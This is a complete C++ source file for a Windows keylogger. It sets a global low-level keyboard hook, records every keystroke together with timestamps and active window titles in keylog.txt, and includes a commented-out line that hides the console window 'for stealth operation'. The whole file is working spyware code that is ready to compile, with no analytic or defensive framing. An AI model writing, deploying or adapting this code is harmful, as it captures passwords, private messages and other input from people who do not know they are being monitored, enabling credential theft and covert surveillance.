#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>

// Global variables
HHOOK keyboardHook;
std::ofstream logFile;
bool running = true;

// Function to get current timestamp
std::string GetTimeStamp() {
    time_t now = time(0);
    struct tm timeInfo;
    char buffer[80];
    localtime_s(&timeInfo, &now);
    strftime(buffer, sizeof(buffer), "[%Y-%m-%d %H:%M:%S] ", &timeInfo);
    return std::string(buffer);
}

// Function to get active window title
std::string GetActiveWindowTitle() {
    char window_title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, window_title, sizeof(window_title));
    return std::string(window_title);
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // If nCode is less than zero, we must pass the message to the next hook
    if (nCode < 0) {
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
    }

    // Only process keydown messages to avoid duplicates
    if (wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbdStruct->vkCode;

        // Check for ESC key to exit when combined with CTRL
        if (vkCode == VK_ESCAPE && GetAsyncKeyState(VK_CONTROL) & 0x8000) {
            running = false;
            return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
        }

        // Log the key with timestamp and active window info
        if (logFile.is_open()) {
            // Get window title for context
            static std::string lastWindowTitle = "";
            std::string currentWindowTitle = GetActiveWindowTitle();

            // Log window title when it changes
            if (currentWindowTitle != lastWindowTitle) {
                logFile << std::endl << GetTimeStamp() << "Window: [" << currentWindowTitle << "]" << std::endl;
                lastWindowTitle = currentWindowTitle;
            }

            // Translate virtual key to readable format
            std::string keyName;

            // Handle special keys
            switch (vkCode) {
                case VK_RETURN: keyName = "[ENTER]"; break;
                case VK_BACK: keyName = "[BACKSPACE]"; break;
                case VK_SPACE: keyName = "[SPACE]"; break;
                case VK_TAB: keyName = "[TAB]"; break;
                case VK_SHIFT: keyName = "[SHIFT]"; break;
                case VK_CONTROL: keyName = "[CTRL]"; break;
                case VK_MENU: keyName = "[ALT]"; break;
                case VK_CAPITAL: keyName = "[CAPS LOCK]"; break;
                case VK_ESCAPE: keyName = "[ESC]"; break;
                case VK_LEFT: keyName = "[LEFT]"; break;
                case VK_RIGHT: keyName = "[RIGHT]"; break;
                case VK_UP: keyName = "[UP]"; break;
                case VK_DOWN: keyName = "[DOWN]"; break;
                default:
                    // Handle regular keys
                    BYTE keyboardState[256] = {0};
                    GetKeyboardState(keyboardState);

                    // Set shift state
                    keyboardState[VK_SHIFT] = GetAsyncKeyState(VK_SHIFT) & 0x8000 ? 0x80 : 0;

                    // Set caps lock state
                    keyboardState[VK_CAPITAL] = GetKeyState(VK_CAPITAL) & 0x0001 ? 0x01 : 0;

                    char key[2] = {0};
                    WORD result = 0;
                    int scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

                    if (ToAscii(vkCode, scanCode, keyboardState, &result, 0) == 1) {
                        key[0] = (char)result;
                        keyName = key;
                    } else {
                        // If cannot translate to ASCII, use the key code in hex
                        char hexCode[8];
                        sprintf_s(hexCode, "0x%02X", vkCode);
                        keyName = std::string("[") + hexCode + "]";
                    }
                    break;
            }

            // Write to log file
            logFile << keyName;
            logFile.flush(); // Make sure the data is written immediately
        }
    }

    // Pass the hook to the next hook in the chain
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    // Create or open log file
    logFile.open("keylog.txt", std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file!" << std::endl;
        return 1;
    }

    // Start a new log session
    logFile << std::endl << std::endl;
    logFile << "====================================================" << std::endl;
    logFile << GetTimeStamp() << "Logging session started" << std::endl;
    logFile << "====================================================" << std::endl;

    // Hide console window for stealth operation (comment out for debugging)
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Set up low-level keyboard hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        logFile << GetTimeStamp() << "Failed to set keyboard hook! Error: " << GetLastError() << std::endl;
        logFile.close();
        return 1;
    }

    logFile << GetTimeStamp() << "Hook installed successfully. Press CTRL+ESC to exit." << std::endl;

    // Message loop
    MSG msg;
    while (running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up
    UnhookWindowsHookEx(keyboardHook);

    // End the log session
    logFile << std::endl;
    logFile << GetTimeStamp() << "Logging session ended" << std::endl;
    logFile.close();

    return 0;
}
